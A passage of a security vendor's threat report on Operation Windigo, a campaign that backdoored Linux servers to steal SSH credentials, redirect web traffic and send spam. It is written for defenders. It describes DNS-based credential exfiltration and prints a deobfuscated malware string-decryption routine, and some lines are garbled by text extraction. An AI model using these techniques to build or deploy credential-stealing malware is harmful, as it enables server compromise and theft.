{
    "id": "7e00c96c-b88e-483f-bf06-beac9f6a9be9",
    "created_at": "2022-10-25T16:48:25.149923Z",
    "updated_at": "2025-03-27T02:16:25.821028Z",
    "deleted_at": null,
    "sha1_hash": "fc22b1691454a74c74616a065bede2c80634873c",
    "title": "",
    "authors": "",
    "file_creation_date": "2014-03-17T12:17:08Z",
    "file_modification_date": "2014-03-18T11:27:14Z",
    "file_size": 3624399,
    "plain_text": "Olivier Bilodeau • Pierre-Marc Bureau • Joan Calvet\n\nAlexis Dorais-Joncas • Marc-Étienne M.Léveillé\n\nBenjamin Vanheuverzwijn\n\n## OPERATION WINDIGO\n\n###### The vivisection of a large Linux server-side \n\n credential stealing malware campaign\n\n\n-----\n\n### TABLE OF CONTENTS\n\n1. Executive Summary 3\n\n2. Introduction 5\n\n3. Operation Windigo 6\n\n3.1. The Big Picture 6\n\n3.2. Timeline of Events 7\n\n3.3. Credential Stealing Modus Operandi 10\n\n3.4. Infection Scenarios 11\n\n3.5. Linux/Ebury Infected Hosts 12\n\n3.6. Web Traffic Redirection Modus Operandi 13\n\n3.7. Analysis of Stolen SSH Passwords 16\n\n3.8. Spam Analysis 17\n\n3.9. DNS Hosting Infrastructure 23\n\n4. Linux/Ebury 26\n\n4.1. Features 26\n\n4.2. Changelog 26\n\n4.3. Persistence 27\n\n4.5. Internals 30\n\n5. Linux/Cdorked 38\n\n5.1. Features 38\n\n5.2. Persistence 38\n\n5.3. Malware Operation 38\n\n5.4. Internals 39\n\n5.5. Linux/Onimiki 42\n\n6. Perl/Calfbot 45\n\n6.1. Features 45\n\n\n6.2. Changelog 46\n\n6.3. Persistence 46\n\n6.4. Malware Operation 46\n\n6.5. Internals 48\n\n7. Windows Malware 53\n\n7.1. Win32/Glupteba.M 53\n\n7.2. Win32/Boaxxe.G 54\n\n8. Conclusion 56\n\nAppendix 1: Indicators\nof Compromise (IOC) 57\n\nA.1.1. Host-based Indicators 57\n\nA.1.2. Network-based Indicators 60\n\nAppendix 2: Cleaning 65\n\nA.2.1. Linux/Ebury 65\n\nA.2.2. Linux/Cdorked 65\n\nA.2.3. Linux/Onimiki 65\n\nA.2.4. Perl/Calfbot 65\n\nAppendix 3: Prevention 66\n\nAppendix 4: File Hashes 67\n\nA.4.1. Linux/Ebury 67\n\nA.4.2. Linux/Cdorked 67\n\nA.4.3. Linux/Onimiki 68\n\nA.4.4. Perl/Calfbot 68\n\nA.4.5. Win32/Glupteba.M 68\n\nA.4.6. Win32/Boaxxe.G 68\n\n\n-----\n\n### LIST OF TABLES\n\n1. Executive Summary\n\n2. Introduction\n\n3. Operation Windigo\n\nTable 3.1 Relationship between malware\ncomponents and their activities 7\n\nTable 3.2 Relationship between\nmalware components and their\nusage in the infrastucture 7\n\nTable 3.3 Linux/Ebury infection count\nfrom different captures 12\n\nTable 3.4 Top 5 countries with\nLinux/Ebury infections 13\n\nTable 3.5 Count of infected web server\nIP addresses 14\n\nTable 3.6 Top 5 countries with\nLinux/Cdorked infections 15\n\nTable 3.7 High level statistics on the\nSSH passwords 16\n\nTable 3.8 Top 5 of the most seen TLDs\nin email list 19\n\nTable 3.9 Spamming efficiency 20\n\nTable 3.10 Top 5 countries sending spam via\nservers infected with Perl/Calfbot 21\n\n4. Linux/Ebury\n\nTable 4.1 Patched binaries Linux/Ebury\nvariant changelog 27\n\nTable 4.2 libkeyutils.so Linux/Ebury\nvariant changelog 27\n\n\nTable 4.3 Linux/Ebury backdoor commands 30\n\nTable 4.4 Symbols looked for by Linux/Ebury\nfor the three OpenSSH binaries 31\n\nTable 4.5 Linux/Ebury shared memory\nsegments 33\n\n5. Linux/Cdorked\n\nTable 5.1 Supported commands 39\n\n6. Perl/Calfbot\n\nTable 6.1 Perl/Calfbot’s variant changelog 46\n\nTable 6.2 Information sent by Perl/Calfbot’s\ninfected server to its C&C 47\n\nTable 6.3 Client-information description 47\n\nTable 6.4 Commands Implemented\nby Perl/Calfbot 48\n\n7. Windows Malware\n\nTable 7.1 Win32/Glupteba.M service\nand corresponding file 53\n\nTable 7.2 List of Commands the Bot Accepts 54\n\n8. Conclusion\n\nAppendix 1: Indicators of\nCompromise (IOC)\n\nTable A.1.1 First generation DGA 61\n\nTable A.1.2 Second generation DGA 61\n\nAppendix 2: Cleaning\n\nAppendix 3: Prevention\n\nAppendix 4: File Hashes\n\n\n-----\n\n### 1. EXECUTIVE SUMMARY\n\nThis document details a large and sophisticated operation, code named “Windigo”, in which\na malicious group has compromised thousands of Linux and Unix servers. The compromised\nservers are used to steal SSH credentials, redirect web visitors to malicious content and send spam.\n\nThis operation has been ongoing since at least 2011 and has affected high profile servers and companies,\n[including cPanel – the company behind the famous web hosting control panel – and Linux Foundation’s](http://docs.cpanel.net/twiki/bin/view/AllDocumentation/CompSystem)\n[kernel.org – the main repository of source code for the Linux kernel. However this operation is not about](https://lwn.net/Articles/464233/)\nstealing company resources or altering Linux’s source code as we will unveil throughout the report.\n\n[The complexity of the backdoors deployed by the malicious actors shows out of the ordinary](http://www.virusradar.com/en/glossary/backdoor)\nknowledge of operating systems and programming. Additionally, extra care was given to ensure\nportability, meaning the various pieces of malware will run on a wide range of server operating\nsystems and to do so in an extremely stealthy fashion.\n\nThis report contains a detailed description of our ongoing investigation of the Windigo operation.\nWe provide details on the number of users that have been victimized and the exact type of resources\nthat are now in control of the gang. Furthermore, we provide a detailed analysis for the three main\nmalicious components of this operation:\n\n[• Linux/Ebury – an OpenSSH backdoor used to keep control of the servers and steal credentials](http://openssh.org)\n\n - Linux/Cdorked – an HTTP backdoor used to redirect web traffic. We also detail the infrastructure\ndeployed to redirect traffic, including a modified DNS server used to resolve arbitrary IP addresses\nlabeled as Linux/Onimiki\n\n - Perl/Calfbot – a Perl script used to send spam\n\nThe Windigo operation does not leverage any new vulnerability against Linux or Unix systems.\nKnown systemic weaknesses were exploited by the malicious actors in order to build and maintain\n[their botnet.](http://www.virusradar.com/en/glossary/botnet)\n\n###### Key Findings\n\n - The Windigo operation has been ongoing since at least 2011\n\n - More than 25,000 unique servers have been compromised in the last two years\n\n - A wide range of operating system have been compromised by the attackers; Apple OS X,\nOpenBSD, FreeBSD, Microsoft Windows (through Cygwin) and Linux, including Linux\non the ARM architecture\n\n - Malicious modules used in Operation Windigo are designed to be portable. The spam-sending\nmodule has been seen running on all kinds of operating systems while the SSH backdoor has been\nwitnessed both on Linux and FreeBSD servers\n\n - Well known organizations including cPanel and Linux Foundation fell victim of this operation\n\n[• Windigo is responsible for sending an average of 35 million spam messages on a daily basis](http://en.wikipedia.org/wiki/Spam_%28electronic%29)\n\n - More than 700 web servers are currently redirecting visitors to malicious content\n\n - Over half a million visitors to legitimate websites hosted on servers compromised by Windigo\n[are being redirected to an exploit kit every day](http://en.wikipedia.org/wiki/Exploit_%28computer_security%29)\n\n - The success rate of exploitation of visiting computers is approximately 1%\n\n - The malicious group favors stopping malicious activity over being detected\n\n - The quality of the various malware pieces is high: stealthy, portable, sound cryptography\n(session keys and nonces) and shows a deep knowledge of the Linux ecosystem\n\n - The HTTP backdoor is portable to Apache’s httpd, Nginx and lighttpd\n\n - The gang maximizes available server resources by running different malware and activities\ndepending on the level of access they have\n\n - No vulnerabilities were exploited on the Linux servers; only stolen credentials were leveraged.\nWe conclude that password-authentication on servers should be a thing of the past\n\n\n-----\n\nThis document’s appendixes includes extensive indicators of compromise (IOC) to allow system\nadministrators and network operators to identify compromised systems. Additionally, cleaning\nand prevention are covered in the appendixes as well.\n\n###### Contact Information\n\n[• For any press inquiries please contact: press@eset.sk](mailto:mailto:press%40eset.sk?subject=)\n\n[• For any technical inquiries please contact: windigo@eset.sk](mailto:mailto:windigo%40eset.sk?subject=)\n\n\n-----\n\n### 2. INTRODUCTION\n\n[The Algonquians are one of the first nations of North America. In their language, the word Windigo](http://en.wikipedia.org/wiki/Wendigo)\nrefers to a demonic creature. In many legends, Windigo is a malevolent half-beast which was\ntransformed from its human shape into a monster because it ate human flesh. Just like Windigo,\na malicious actor is currently cannibalizing thousands of servers, turning legitimate resources\ninto a wide infrastructure used for nefarious purposes.\n\nESET started researching a set of malicious software targeting Linux servers in the beginning\nof 2012. Since then, we have realized that many of these components are actually related.\nWe soon discovered that one malicious group is currently in control of more than ten thousand\nservers. They are currently using these resources to redirect web traffic from legitimate websites\nto malicious content, to send spam messages, and to steal more credentials from users logging\nonto these servers.\n\n[ESET’s research around Operation Windigo is part of a joint research effort with CERT‑Bund,](https://www.bsi.bund.de/EN/Topics/IT-Crisis-Management/Cert-Bund/cert-bund_node.html)\n[the Swedish National Infrastructure for Computing, the European Organization for Nuclear](http://www.snic.vr.se/)\n[Research (CERN) and other organizations forming an international Working Group.](http://home.web.cern.ch/about)\n\nThe number of systems affected by Operation Windigo might seem small when compared\nwith recent malware outbreaks where millions of desktops are infected. It is important to keep\nin mind that, in this case, each infected system is a server. These usually offer services to numerous\nusers and are equipped with far more resources in terms of bandwidth, storage and computation\npower than normal personal computers. A denial of service attack or a spam-sending operation\nusing one thousand servers is going to be far more effective than the same operation performed\nwith the same number of desktop computers.\n\nIn this report, we present a global overview of Operation Windigo, showing analysis of information\n[we were able to gather from various sources, including traffic capture from command and control](http://www.virusradar.com/en/glossary/command-and-control-server)\n[servers. This overview shows how all the different components of the operation fit together and](http://www.virusradar.com/en/glossary/command-and-control-server)\nprovides an estimate of the size of the operation.\n\nWe then give a detailed description of the three main modules used in the Windigo operation.\nThe first module consists of the backbone of the operation, an OpenSSH backdoor labeled Linux/Ebury.\n[This backdoor was first publicly discussed in 2011 when it was named “Ebury”. Next, we detail](http://plog.sesse.net/blog/tech/2011-11-15-21-44_ebury_a_new_ssh_trojan.html)\nthe component used to redirect web traffic, called Linux/Cdorked. Afterward, we look into\nPerl/Calfbot, a Perl script used to send spam messages.\n\nFinally, we provide detailed information for system administrators on how to detect if their systems\nare compromised and how to clean infections from the various modules.\n\n###### Why we are Publishing this Report\n\nWe chose to publish this report to raise awareness around this malicious operation. Many hosting\nservice providers have been completely compromised, including their billing systems. We think\nthe best course of action to mitigate this threat is to provide an in-depth analysis of the various\npieces of malware used in this attack. It is also for this reason that we are publishing detailed\ninstructions on how to detect hosts infected by the various modules (in the IOC section\nof this document).\n\nDuring the course of our efforts, we have paid strict attention to notifying victims and assisting those\nwho responded in their cleaning efforts. The present report is another step in the process of securing\nthe infected servers and raising awareness around the major threat that is Operation Windigo.\n\n\n-----\n\n### 3. OPERATION WINDIGO\n\n##### 3.1. The Big Picture\n\nThe Windigo operation has been ongoing for years. We think the primary purpose of this significant\neffort is monetary profit through the following actions:\n\n - Spam\n\n - Infecting web users’ computers through drive-by downloads\n\n - Redirecting web traffic to advertisement networks\n\nIn this section, we give an overview of the Windigo operation and how it evolved over time.\nFurthermore, we analyze various sources of data we were able to access during the course\nof our investigation.\n\nThe following picture shows a high level perspective of the Windigo operation.\n\n\nSpam\n\n\nLegitimate system/user\n\nInvolved in malicious\nactivity\n\nInfected with\nLinux/Ebury\n\nInfected with\nLinux/Cdorked\n\nInfected with\nLinux/Onimiki\n\nInfected with\nPerl/Calfot\n\n|Col1|Col2|Col3|\n|---|---|---|\n|loys|deploys||\n\n\ngathered information on\nall Linux/Ebury\ninfected hosts\n\ndeploy malware\non servers\n\n\nOperator\n\n\nPerl/Calbot SSH tunnel All Linux/Eburyinfected hosts\n\nHTTPS reverse proxy SSH tunnel Linux/Ebury\nexfiltration server\n\n**C&C**\n\nfetch credentials\n\nPerl/Calbot\nC&C server **i**\n\nAnnonymising\ntunnel endpoint\n\n\nFigure 3.1 High level perspective of Windigo’s components and their relationship\n\nAs depicted, several pieces of malicious software take part in the Windigo operation:\n\n - Linux/Ebury runs mostly on Linux servers. It provides a root backdoor shell and has the ability\nto steal SSH credentials.\n\n - Linux/Cdorked runs mostly on Linux web servers. It provides a backdoor shell and distributes\nWindows malware to end users via drive-by downloads.\n\n - Linux/Onimiki runs on Linux DNS servers. It resolves domain names with a particular pattern\nto any IP address, without the need to change any server-side configuration.\n\n\n-----\n\n - Perl/Calfbot runs on most Perl supported platforms. It is a lightweight spam bot written in Perl.\n\n - Win32/Boaxxe.G, a click fraud malware, and Win32/Glubteta.M, a generic proxy, run\non Windows computers. These are the two threats distributed via drive-by download.\n\nIn summary, Windigo operators pursue multiple activities through these malware families:\n\n\nTable 3.1 Relationship between malware components and their activities\n\n\nMalicious Activity Malware Component\n\nSpam Win32/Glupteba.M, Perl/Calfbot, Linux/Ebury\n\nDrive-by downloads Linux/Cdorked\n\nAdvertisement fraud Linux/Cdorked, Win32/Boaxxe.G\n\nCredential stealing Linux/Ebury\n\nOne extraordinary characteristic of this operation is the sheer number of infected servers supporting\nthe above mentioned malicious activities. In other words, there are two kinds of victims here: Windows\nend-users visiting legitimate web sites hosted on compromised servers, and Linux/Unix server operators\nwhose servers were compromised through the large server-side credential stealing network.\nThe malicious actors are using these compromised servers to run one or more malicious services\nnecessary for managing their whole operation. Here are the types of services and their related\nmalware component:\n\n\nTable 3.2 Relationship between malware components and their usage in the infrastucture\n\n\nMalicious Infrastructure Service Malware Component Involved\n\nSpam-related DNS services Linux/Ebury with TinyDNS\n\nCdorked DNS services Linux/Ebury with Linux/Onimiki\n\nCredential exfiltration service Linux/Ebury with additional binary component\n\nConfiguration service Linux/Ebury\n\nSSH tunnel all infected with Linux/Ebury\n\n[Reverse proxy service](http://en.wikipedia.org/wiki/Reverse_proxy) all infected with Linux/Ebury\n\nAnonymizing tunnel Linux/Ebury\n\n##### 3.2. Timeline of Events\n\nThis section details the timeline of events around the Windigo operation, as seen by ESET researchers.\n\n2011 SEPTEMBER 2011 NOVEMBER 2013 FEBRUARY 2013 APRIL 2013 JUNE\n\n\nkernel.org compromised Steinar H. Gunderson\nwith Linux/Ebury publishes a first technical\nanalysis of Linux/Ebury\n\n\ncPanel reports systems in\ntheir support department\nhad been compromised\nwith Linux/Ebury\n\nCERT-Bund starts\nnotifying victims\nof Linux/Ebury\n\n\nA publication of the first\ntechnical analysis\nof Linux/Cdorked\nis made with Sucuri\n\n\nThe link between\nLinux/Ebury and\nLinux/Cdorked is made\n\nNetwork traffic capture\nreveals more than\n7 500 hosts infected\nwith Linux/Ebury\n\n\n2014 JANUARY 2013 OCTOBER 2013 SEPTEMBER 2013 JULY\n\n\nNetwork traffic capture\nof Perl/Calfot C&C\nreveals that an average\nof 35 million of spam\nmessages are sent daily\n\n\nNetwork traffic capture\nreveals more than\n12 000 hosts infected\nwith Linux/Ebury\n\n\nNetwork traffic capture\non Linux/Cdorked\nredirection target\nreveals over 1 million\nmalicious web redirections\nin two days\n\n\nA new related spamsending malware is found:\nPerl/Calfot\n\n\nFigure 3 2 Timeline of Events\n\n\n-----\n\n###### 2011\n\n[• September: The Linux Foundation internally announces the compromise of several of their](http://pastebin.com/BKcmMd47)\n[back-end servers as well as 448 kernel.org users. While no report explaining what happened](http://arstechnica.com/security/2013/09/who-rooted-kernel-org-servers-two-years-ago-how-did-it-happen-and-why)\n[at the Linux Foundation has been published so far, several](http://www.theregister.co.uk/2011/08/31/linux_kernel_security_breach/) [news](https://isc.sans.edu/forums/diary/Kernelorg%2BCompromise/11497) [articles as well as trusted sources](http://thehackernews.com/2011/09/kernelorg-server-rooted-and-448-users.html)\nindicate that two sophisticated malware have been used against the Linux Foundation. While\n[the first malware is the well-known Phalanx2 rootkit, overwhelming evidence indicate](http://volatility-labs.blogspot.ch/2012/10/phalanx-2-revealed-using-volatility-to.html)\nthat the second malware, distributed as modified OpenSSH files, is in fact an early version\nof Linux/Ebury. The timeline is interesting as well: while Phalanx2 had been used in many\ncompromises before, it has not, to our knowledge, been seen in the wild after the Linux\nFoundation compromise. Interestingly, this was the first known case involving Linux/Ebury.\n\n[• November: First blog post about Ebury by Steinar H. Gunderson. The technical description](http://plog.sesse.net/blog/tech/2011-11-15-21-44_ebury_a_new_ssh_trojan.html)\nof this backdoor exactly matches the results of our analysis of Linux/Ebury.\n\n###### 2012\n\n - November: First observation of Linux/Cdorked redirection URL patterns.\n\n###### 2013\n\n[• February: cPanel announces one of their support server was compromised with the Linux/Ebury](http://docs.cpanel.net/twiki/bin/view/AllDocumentation/CompSystem)\ntrojan. It is likely this infection helped spread the malware into multiple organizations.\n\n - February: CERT‑Bund identifies more than 11,000 servers infected with Linux/Ebury. Notifications\non compromised servers are sent to hosting providers and national CERTs.\n\n - March: ESET receives the first Linux/Cdorked sample from the security firm Sucuri.\n\n - April: The malicious group responds to victim notifications by upgrading most infected servers\nto a new version of Linux/Ebury. This version uses a new algorithm for generating domain names\nused for exfiltrating information.\n\n[• April: Sucuri and ESET publish a detailed analysis of the Linux/Cdorked malware affecting](http://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/)\nthe Apache web server. Standalone tools are also published which system administrators detect\nthe malware on production servers and to dump configuration information stored only in RAM.\n\n - May: ESET receives additional malware samples from system administrators who are cleaning\n[their servers. Publication of a second blog post confirming that other web servers such](http://www.welivesecurity.com/2013/05/07/linuxcdorked-malware-lighttpd-and-nginx-web-servers-also-affected/)\nas lighttpd and nginx can also be infected with Linux/Cdorked.\n\n - May: ESET starts extensive monitoring of Linux/Cdorked infected websites, discovering\nthat several hundreds of thousands of our customers browse these websites each month.\n\n - June: The Windigo operators release a new version of their DNS backdoor (dubbed Linux/Onimiki)\nchanging the hostnames pattern used by the operation. The operators also released a new version\nof the Linux/Cdorked HTTP backdoor to evade the detection tool released in April.\n\n - June: First sample of the OpenSSH backdoor Linux/Ebury received by ESET.\n\n - June: Access to one of the servers used to exfiltrate credentials stolen by Linux/Ebury reveals\nmore than 7,000 hosts are infected by the malware.\n\n - July: Discovery of Perl/Calfbot spam sending module found on a host infected with Linux/Ebury.\n\n - July: Discovery of a TinyDNS configuration file reveals 62,186 unique domain names tying together\nvarious pieces of the puzzle. It shows that the same group is responsible for sending spam,\nredirecting users to exploit kits and other malicious activities.\n\n - September: ESET captures network traffic from a server infected by Linux/Ebury running\na reverse proxy service used as a target for Linux/Cdorked redirections, revealing over\n1,000,000 web redirections in 48 hours.\n\n - October: ESET captures 72 hours of network traffic revealing more than 12,000 servers infected\nwith Linux/Ebury.\n\n###### 2014\n\n[• January:CERT‑Bund publishes an Ebury-FAQ after receiving many questions related](https://www.cert-bund.de/ebury-faq)\nto the notification of infected parties.\n\n - January: ESET captures network traffic during three distinct 24-hour periods from a server running\nboth a Linux/Ebury exfiltration service and a Perl/Calfbot command and control reverse proxy,\nrevealing an average of 35 million spam messages sent daily.\n\nFebr ar [First p blic reference of a connection bet](http://reverse.put.as/2014/02/05/linuxhackingteamrdorks-a-a-new-and-improved-version-of-linuxcdorked-a/) een Lin /Eb r and Lin /Cdorked\n\n\n-----\n\n###### 3.2.1. Tying Pieces Together\n\nThis section provides the evidence leading us to conclude that the components of Operation Windigo\nare developed and operated by the same group.\n\nShared Infrastructure\n\nWhen correlating the Linux/Ebury exfiltration server data with the Linux/Cdorked data,\nwe noticed that a majority of the hosts infected with Linux/Cdorked were also infected with Linux/Ebury.\nThe same can be said of the other malicious components. The Win32/Glupteba.M’s command\nand control server is hosted on a Linux/Ebury infected host; the same goes for Perl/Calfbot’s.\n\nLastly, Win32/Glupteba.M, a generic proxy, is solely used to relay spam. Upon investigation of its spam\nmessages, we found out that they contain the same URLs as the ones in Perl/Calfbot’s spam messages.\n\nShared Code\n\nDuring our analysis of Linux/Cdorked and Linux/Ebury we realized that a custom decryption\nalgorithm sported very similar characteristics. This algorithm use the client IP address as a seed\nto decrypt the underlying data.\n\nLinux/Cdorked Linux/Ebury\n\nFigure 3.3 Comparing Linux/Cdorked and Linux/Ebury custom cryptography\n\nAlthough reorganized a little bit due to different compiler behavior, the code is effectively the same\nand holds the same constants 5, 33, 55 and 78.\n\n\n-----\n\nThen, looking at Perl/Calfbot’s code something oddly familiar struck us:\n\nDeobfuscated Perl/Calfbot String Decryption Code\n\n\n**...**\n**my @h7fk;**\n**$h7fk[0] = ( ( ( $key & 0xFF000000 ) >> 24 ) + 15 ) % 256;**\n**$h7fk[1] = ( ( ( $key & 0x00FF0000 ) >> 16 ) + 13 ) % 256;**\n**$h7fk[2] = ( ( ( $key & 0x0000FF00 ) >> 8 ) + 52 ) % 256;**\n**$h7fk[3] = ( ( ( $key & 0x000000FF ) ) + 71 ) % 256;**\n**my $apjn;**\n**for ( my $i = 0 ; $i < length($encrypted_string) / 2 ; $i++ ) {**\n**my $id5b = hex( substr( $encrypted_string, $i * 2, 2 ) );**\n**$h7fk[ ( $i + 1 ) % 4 ] = ( $h7fk[ ( $i + 1 ) % 4 ] + $id5b )% 256;**\n**$apjn .= chr( $id5b ^ $h7fk[ $i % 4 ] );**\n**}**\n**return $apjn;**\n**}**\n**...**\n\n\nHere we have the same algorithm as Linux/Cdorked and Linux/Ebury but with slightly different\nconstants.\n\n##### 3.3. Credential Stealing Modus Operandi\n\nSSH user credentials leaks is the only technique we observed for expanding the Windigo operation.\nThere are two typical scenarios where SSH credentials get stolen. The first scenario is when a user\nsuccessfully logs into an infected server. The second scenario is when a user uses a compromised\nserver to log on any other system.\n\nThe Linux/Ebury backdoor is the module responsible for the credential stealing and constitutes\nthe backbone of the Windigo operation. A technical description of this threat can be found\nin the Linux/Ebury section of this document.\n\nClean server\n\n**3** **4**\n\nLegitimate system/user\n\nDeploy Linux/Ebury\n\nInvolved in malicious\nactivity\n\nInfected with\n\nuse Linux/Ebury\n\nDNS packet\nwith credentials\n\nVictim Server with Exfiltration servers\n\nLinux/Ebury\n\nConnect with backdoor Collect credentials\nto collect passwords (every 5 minutes)\n(twice a day) Annonymising\n\ntunnel endpoint\n\nOperator\n\nFigure 3.4 Detailed Linux/Ebury credential stealing infrastructure\n\n\n-----\n\nDepicted above are the various pieces related to the Linux/Ebury threat. Credentials intercepted\nby Linux/Ebury are sent to the exfiltration servers through custom DNS queries. These credentials\nare then used to further spread the infection as detailed in the next section.\n\nThe gang practices good operational security. They never directly connect to any of the compromised\nservers to perform an operation. They use one of the anonymizing tunnel services running on another\ncompromised server part of the malicious infrastructure.\n\nThis tunnel is usually used to fetch stolen credentials that are stored on various infected servers.\n\n##### 3.4. Infection Scenarios\n\nThe following figure shows a typical scenario when a server has his credentials compromised.\nDepending on the level of privileges the attacker has gained, he will use the server in different ways.\n\nUser logs into\na clean machine from\na compromised server\n\nInstall Linux/Cdorked\nto redirect web traffic\n\n**WEB**\n\nCredentials Root credentials? Webserver hosted?\nleaked to\nWindigo operator Install Linux/Ebury Use as part of\n\nWindigo infrastructure:\n\nLinux/Ebury exfiltration\n\nReverse proxy\n\nSpam-related DNS services\n\nInstall Perl/Calfot\n\nSSH tunnel\n\nLegitimate system/user\n\nInstall Linux/Onimiki\n\nInvolved in malicious\nactivity **Do nothing** ...\n\nInfected with\nLinux/Ebury\n\nInfected with\nLinux/Cdorked\n\nInfected with\nPerl/Calfot\n\nFigure 3.5 Flowchart of Windigo’s credential stealing scenario\n\nOnce credentials are exfiltrated and in the hands of the Windigo operators, they are tested\nto determine the privilege level obtained. In the case of non-root access, the server is either\nleft untouched or installed with the Perl/Calfbot module.\n\nIn case of root access, the Linux/Ebury backdoor is always installed in order to maintain access\nto the server even if the credentials are modified later by the system administrator. In some\nrare instances Perl/Calfbot is installed as root but this is marginal as can be observed from\nthe Perl/Calfbot C&C metadata analysis covered later.\n\nIf the compromised server operates one or more legitimate websites then further infection with\nLinux/Cdorked is likely. Additionally, zero or more malicious services from the previously mentioned\nmalware infrastructure list may also be deployed. For example, if the server’s HTTPS port (443)\nis reachable from the Internet then an nginx reverse proxy instance could be deployed to act\nas a first layer of indirection between the Perl/Calfbot infected hosts and the true C&C server.[1]\n\nThis shows that the operators are maximizing what they can get out of the servers they have\naccess to. Various pieces of malware and various services are used, but the malware linking\nall of this together is definitely Linux/Ebury.\n\n1 It is possible that multiple indirection layers are used to further hide the true C&C\n\n\n-----\n\n##### 3.5. Linux/Ebury Infected Hosts\n\nThis section gives a general overview of the number of hosts infected with Linux/Ebury and their\ngeographic location. The data used to generate these statistics come from the various network\ntraffic captures explained in the timeline section of this document.\n\nThe following table shows the number of unique infected IP addresses for each capture:\n\n\nTable 3.3 Linux/Ebury infection count from different captures\n\n\nCount of Unique\nCapture Date Infected IP addresses\n\nJune 2013 7,707\n\nOctober 2013 12,326\n\nJanuary 2014 11,110\n\nSince we began monitoring the operation, we observed 26,024 unique IP addresses infected with\nLinux/Ebury. Our latest capture from January 2014 shows that 3,794 new IP addresses have been\ninfected since our October capture. Some of them could have been infected before this period, but if\nwe assume all these new IP addresses are new victims, it means that an average of 38 new infections\noccurred daily. In addition to the Linux infected hosts we have seen a total of 147 hosts running\nFreeBSD.\n\n\nSide Story\n[We found an official mirror of CentOS packages infected with Linux/Ebury. Fortunately, no package](http://centos.org/)\nfiles were seemingly altered by the malicious operators. However knowing that Linux RPM packages\nare cryptographically signed such tampering is probably infeasible.\n\n\nThe size of this botnet and its growth curve are much smaller than botnets targeting typical\nend‑user operating systems such as Microsoft Windows. However, keep in mind that every single\ncompromised host potentially exposes every end user visiting its website, as well as enabling\nthe theft of more server credentials. The impact of one Windigo infection is many orders\nof magnitude greater than a single infected end-user workstation.\n\n0 10 065\n\nFigure 3.6 Geographic distribution of Linux/Ebury infected hosts\n\n\n-----\n\nA total of 110 countries have been affected by Linux/Ebury, with the top 5 as follows:\n\n\nTable 3.4 Top 5 countries with Linux/Ebury infections\n\n\nPosition Country Count\n\n1 United States 10,065\n\n2 Germany 2,489\n\n3 France 1,431\n\n4 Italy 1,169\n\n5 United Kingdom 993\n\nOthers 9,877\n\nTotal 26,024\n\n##### 3.6. Web Traffic Redirection Modus Operandi\n\nWeb servers infected with Linux/Cdorked redirect users to exploit kit servers, which in turn attempt\nto infect users with malware. This section provides a high-level overview of this redirection mechanism\nand statistics related to the population of infected web servers. A thorough analysis of Linux/Cdorked\nis presented later in this document.\n\nPOST requests\n\n**40**\n\nVictim Server with Servers sending\n\nLinux/Cdorked Cdorked configuration\n\nis redirect to\n\nCdorked domain pattern example:\n\n**uvj14j52q1h5xlm5kawrq9i.legitdomain.com** Name server for\n\nLegitimate system/user **legitdomain.com**\n\nwith Linux/Onimiki\n\nInvolved in malicious\nactivity\n\nInfected with\nLinux/Ebury\n\nInfected with\nLinux/Cdorked\n\nInfected with\nLinux/Onimiki\n\nRedirection path\n\nServer distributing\nmalicious content\n\n**N** **9**\n\nServers running Servers running\nnginx reverse proxy nginx reverse proxy\non port 80 on port 1905\n\nFigure 3.7 Malware infrastructure behind the Web traffic redirection\n\nThe redirection logic can be roughly summarized by the following three steps:\n\n1. Victims visit a legitimate website hosted on a Linux/Cdorked infected server, which then redirects\nthem to a specially crafted subdomain of a legitimate domain name. This redirection is not automatic\nand depends on certain conditions set by the operators through a series of Linux/Ebury\ninfected servers.\n\n\n-----\n\n2. The authoritative nameserver for the legitimate domain name, infected with another component\nof the Windigo operation called Linux/Onimiki, returns an IP address encoded in the subdomain\nitself. This allows the Windigo operation to rely on legitimate nameservers, making networkbased detection harder, as we will explain in more detail in the section on Linux/Onimiki.\nThe IP address belongs to a reverse proxy server.\n\n3. This server is the entry-point of a chain of reverse proxy servers terminating on an exploit serving\nmachine (more on that later). After several network exchanges, an attempt is made to exploit\nthe user and, in case of success, they receive some malicious payload, whereas in case of failure\nthey are redirected to advertisements.\n\n\nSide Story\nIn some cases, iPhone User-Agents were being\nredirected to pornographic content instead\nof an exploit kit.\n\n\nFigure 3.8 Example of Linux/Cdorked\nredirection for iPad\n\n\nUsing our telemetry systems, we are able to monitor accesses to the reverse proxies.\nA field present in the redirection URLs contains the domain name visited by the user victim\nof the redirection, allowing us to enumerate all the infected domains visited by ESET users.\n\nThe following table shows a count of infected web server IP addresses for the last three months\nat the time of writing, namely November 2013, December 2013 and January 2014. The IP addresses\nwere obtained through DNS records databases from the infected domains.\n\n\nTable 3.5 Count of infected web server IP addresses\n\n\nUnique Infected\nCollection Date IP addresses\n\nNovember 2013 1,593\n\nDecember 2013 831\n\nJanuary 2014 771\n\nFor these three months 2,183 unique IP addresses were seen distributing malicious content\nassociated with Linux/Cdorked. Only 221 of these IP addresses were seen during all three months,\nindicating a pretty strong turnover.\n\n\n-----\n\nThe following map shows the infected servers geographical distribution:\n\n0 1,225\n\nFigure 3.9 Geographic distribution of Linux/Cdorked infections\n\nOver the three months 63 different countries were touched, and the actual top 5 countries with\ntheir number of infected servers is the following:\n\n\nTable 3.6 Top 5 countries with Linux/Cdorked infections\n\n\nPosition Country Count\n\n1 United States 1,225\n\n2 United Kingdom 151\n\n3 Germany 129\n\n4 Netherlands 65\n\n5 Turkey 61\n\nOthers 552\n\nTotal 2,183\n\nWe believe that the clear dominance of USA in this top 5, as well as the second and third place of UK\nand Germany, is simply the reflection of the number of hosting companies in these countries, more\nthan a deliberate strategy from Windigo operators.\n\n\n-----\n\n##### 3.7. Analysis of Stolen SSH Passwords\n\nDuring the course of the investigation, we were able to monitor data sent to exfiltration servers.\nFor a period of five days, we recorded the credentials successfully used to log into servers. We captured\n5,362 unique successful logins coming from 2,840 different IP addresses, yielding 2,145 unique passwords.\n\n#### 3,042\nother\n\n#### 2,221\nroot\n\nFigure 3.10 Username distribution of stolen credentials\n\nSeeing a large proportion of root credentials stolen by Linux/Ebury is not surprising considering\nthat the malware must be installed as root by the Windigo operators. The higher the number of root\npasswords, the higher the number of infections which turns into greater chances of stealing other\nroot credentials.\n\nWe further analyzed the credentials and here are some high level statistics on the passwords:\n\n\nTable 3.7 High level statistics on the SSH passwords\n\n\nNumber of unique passwords 2,145\n\nNumber of passwords containing only alphabetic characters 190\n\nNumber of passwords containing only numeric characters 36\n\nNumber of passwords containing only alpha numeric characters 